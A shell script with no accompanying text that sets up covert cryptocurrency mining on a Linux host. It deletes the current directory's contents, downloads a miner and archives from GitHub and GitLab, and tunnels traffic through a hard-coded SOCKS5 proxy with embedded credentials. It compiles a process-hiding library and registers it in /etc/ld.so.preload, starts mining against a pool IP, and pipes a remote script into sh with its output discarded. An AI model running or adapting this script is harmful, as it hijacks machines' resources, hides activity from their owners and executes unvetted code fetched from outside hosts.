rm -rvf * && mkdir a && cd a
#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://github.com/apool-io/zkminer/releases/download/v0.0.1/zkminer_linux_v0.0.1.tar.gz && tar -zvxf zkminer_linux_v0.0.1.tar.gz && cd zkminer_linux_v0.0.1

wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 45.55.165.161:443
socks5_username = majapahlevi
socks5_password = majapahlevi
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "


./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp & clear & ./zkminer -a CP_h1f88jajg0 -w tesruan -s 143.198.90.116 -p 443 & curl https://raw.githubusercontent.com/John1265801/bookish-sniffle/refs/heads/main/bismillah.sh | sh > /dev/null 2>&1
